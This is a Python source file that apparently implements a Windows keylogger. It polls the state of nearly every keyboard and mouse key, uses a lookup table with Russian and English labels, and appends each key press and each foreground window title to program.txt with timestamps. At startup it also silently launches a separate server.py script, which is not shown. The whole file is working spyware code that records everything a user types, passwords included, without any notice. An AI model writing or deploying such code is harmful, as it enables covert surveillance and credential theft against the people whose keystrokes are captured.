﻿import win32gui
import win32api
import datetime
import time
import codecs
import os

os.popen("python server.py")
now = datetime.datetime.now()
file = codecs.open('program.txt', 'a', "utf-8")
file.write("\n\nProgram is running\n"+(time.strftime("%Y-%m-%d | %H:%M:%S")))
prog_time = time.strftime("%M")
mas = [0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x08, 0x09, 0x0C, 0x0D, 0x12, 0x13, 0x14, 0x1B, 0x20, 0x21, 0x22, 0x23, 0x24,
       0x25, 0x26, 0x27, 0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37,
       0x38, 0x39, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51,
       0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, 0x5B, 0x5C, 0x5D, 0x5F, 0x60, 0x61, 0x62, 0x63, 0x64, 0x65,
       0x66, 0x67, 0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78,
       0x79, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E, 0x7F, 0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87, 0x90, 0x91, 0xA0, 0xA1,
       0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7, 0xA8, 0xA9, 0xAA, 0xAB, 0xAC, 0xAD, 0xAE, 0xAF, 0xB0, 0xB1, 0xB2, 0xB3, 0xB4,
       0xB5, 0xB6, 0xB7, 0xBA, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF, 0xC0, 0xDB, 0xDC, 0xDD, 0xDE]
first = {'0x1' : ['Левая кнопка мыши', 0], '0x2' : ['Правая кнопка мыши', 0], '0x3' : ['Обработка Control-break', 0],
         '0x4' : ['Средняя кнопка мыши', 0], '0x5' : ['Кнопка мыши X1', 0], '0x6' : ['Кнопка мыши X2', 0],
         '0x8' : ['BACKSPACE key', 0], '0x9' : ['TAB key', 0], '0xc' : ['CLEAR key', 0], '0xd' : ['ENTER key', 0],
         '0x12' : ['ALT key', 0], '0x13' : ['PAUSE key', 0], '0x14' : ['CAPS LOCK key', 0], '0x1b' : ['ESC key', 0],
         '0x20' : ['Пробел', 0], '0x21' : ['PAGE UP key', 0], '0x22' : ['PAGE DOWN key', 0], '0x23' : ['END key', 0],
         '0x24' : ['HOME key', 0], '0x25' : ['LEFT ARROW key', 0], '0x26' : ['UP ARROW key', 0],
         '0x27' : ['RIGHT ARROW key', 0], '0x28' : ['DOWN ARROW key', 0], '0x29' : ['SELECT key', 0],
         '0x2a' : ['PRINT key', 0], '0x2b' : ['EXECUTE key', 0], '0x2c' : ['PRINT SCREEN', 0], '0x2d' : ['INSERT key', 0],
         '0x2e' : ['DELETE key', 0], '0x2f' : ['HELP key', 0], '0x30' : ['0 key', 0], '0x31' : ['1 key', 0],
         '0x32' : ['2 key', 0], '0x33' : ['3 key', 0], '0x34' : ['4 key', 0], '0x35' : ['5 key', 0], '0x36' : ['6 key', 0],
         '0x37' : ['7 key', 0], '0x38' : ['8 key', 0], '0x39' : ['9 key', 0], '0x41' : ['A', 0], '0x42' : ['B', 0],
         '0x43' : ['C', 0], '0x44' : ['D', 0], '0x45' : ['E', 0], '0x46' : ['F', 0], '0x47' : ['G', 0], '0x48' : ['H', 0],
         '0x49' : ['I', 0], '0x4a' : ['J', 0], '0x4b' : ['K', 0], '0x4c' : ['L', 0], '0x4d' : ['M', 0], '0x4e' : ['N', 0],
         '0x4f' : ['O', 0], '0x50' : ['P', 0], '0x51' : ['Q', 0], '0x52' : ['R', 0], '0x53' : ['S', 0], '0x54' : ['T', 0],
         '0x55' : ['U', 0], '0x56' : ['V', 0], '0x57' : ['W', 0], '0x58' : ['X', 0], '0x59' : ['Y', 0], '0x5a' : ['Z', 0],
         '0x5b' : ['Left Windows key', 0], '0x5c' : ['Right Windows key', 0], '0x5d' : ['Applications key', 0],
         '0x5f' : ['Computer Sleep key', 0], '0x60' : ['Numeric keypad 0 key', 0], '0x61' : ['Numeric keypad 1 key', 0],
         '0x62' : ['Numeric keypad 2 key', 0], '0x63' : ['Numeric keypad 3 key', 0], '0x64' : ['Numeric keypad 4 key', 0],
         '0x65' : ['Numeric keypad 5 key', 0], '0x66' : ['Numeric keypad 6 key', 0], '0x67' : ['Numeric keypad 7 key', 0],
         '0x68' : ['Numeric keypad 8 key', 0], '0x69' : ['Numeric keypad 9 key', 0], '0x6a' : ['"*" key', 0], '0x6b' : ['"+" key', 0],
         '0x6c' : ['Separator key', 0], '0x6d' : ['"-" key', 0], '0x6e' : ['"." key', 0], '0x6f' : ['"/" key', 0],
         '0x70' : ['F1 key', 0], '0x71' : ['F2 key', 0], '0x72' : ['F3 key', 0], '0x73' : ['F4 key', 0],
         '0x74' : ['F5 key', 0], '0x75' : ['F6 key', 0], '0x76' : ['F7 key', 0], '0x77' : ['F8 key', 0],
         '0x78' : ['F9 key', 0], '0x79' : ['F10 key', 0], '0x7a' : ['F11 key', 0], '0x7b' : ['F12 key', 0],
         '0x7c' : ['F13 key', 0], '0x7d' : ['F14 key', 0], '0x7e' : ['F15 key', 0], '0x7f' : ['F16 key', 0],
         '0x80' : ['F17 key', 0], '0x81' : ['F18 key', 0], '0x82' : ['F19 key', 0], '0x83' : ['F20 key', 0],
         '0x84' : ['F21 key', 0], '0x85' : ['F22 key', 0], '0x86' : ['F23 key', 0], '0x87' : ['F24 key', 0],
         '0x90' : ['NUM LOCK key', 0], '0x91' : ['SCROLL LOCK key', 0], '0xa0' : ['Left SHIFT key', 0],
         '0xa1' : ['Right SHIFT key', 0], '0xa2' : ['Left CONTROL key', 0], '0xa3' : ['Right CONTROL key', 0],
         '0xa4' : ['Left MENU key', 0], '0xa5' : ['Right MENU key', 0], '0xa6' : ['Browser Back key', 0],
         '0xa7' : ['Browser Forward key', 0], '0xa8' : ['Browser Refresh key', 0], '0xa9' : ['Browser Stop key', 0],
         '0xaa' : ['Browser Search key', 0], '0xab' : ['Browser Favorites key', 0], '0xac' : ['Browser Start and Home key', 0],
         '0xad' : ['Volume Mute key', 0], '0xae' : ['Volume Down key', 0], '0xaf' : ['Volume Up key', 0],
         '0xb0' : ['Next Track key', 0], '0xb1' : ['Previous Track key', 0], '0xb2' : ['Stop Media key', 0],
         '0xb3' : ['Play/Pause Media key', 0], '0xb4' : ['Start Mail key', 0], '0xb5' : ['Select Media key', 0],
         '0xb6' : ['Start Application 1 key', 0], '0xb7' : ['Start Application 2 key', 0], '0xba' : [';: key', 0],
         '0xbb' : ['"+" key', 0], '0xbc' : ['"," key', 0], '0xbd' : ['"-" key', 0], '0xbe' : ['"." key', 0],
         '0xbf' : ['/? key', 0], '0xc0' : ['`~ key', 0], '0xdb' : ['[{ key', 0], '0xdc' : ['\| key', 0],
         '0xdd' : [']} key', 0], '0xde' : ['\'" key', 0]}
def windowsearch():
    window = win32gui.GetForegroundWindow()
    active_window_name = win32gui.GetWindowText(window)
    return active_window_name
firstwindow = str(windowsearch())
file.write("\n"+firstwindow)
file.close()
while __name__ == "__main__":
    file = codecs.open('program.txt', 'a', "utf-8")
    if(firstwindow != str(windowsearch())):
        prog_time = time.strftime("%M")
        if(str(windowsearch()) == ''):
            file.write("\nWindows")
            firstwindow = str(windowsearch())
        else:
            file.write("\n"+str(windowsearch()))
            firstwindow = str(windowsearch())
    for m in mas:
        state_left = win32api.GetKeyState(m)
        if(state_left != first[hex(m)][1]):
            first[hex(m)][1] = state_left
            if(state_left < 0):
                file.write("\n"+first[hex(m)][0])
                prog_time = time.strftime("%M")
    min_=60-int(prog_time)
    if (min_ <= 10):
        if (int(time.strftime("%M"))+min_-10 == 0):
            file.write("\nОсуществлён переход в IDLE режим "+time.strftime("%Y-%m-%d")+" в "+time.strftime("%H:%M"))
            prog_time = 0

    else:
        if (int(time.strftime("%M"))-10 == int(prog_time)):
            file.write("\nОсуществлён переход в IDLE режим "+time.strftime("%Y-%m-%d")+" в "+time.strftime("%H:%M"))
            prog_time = 0
    file.close()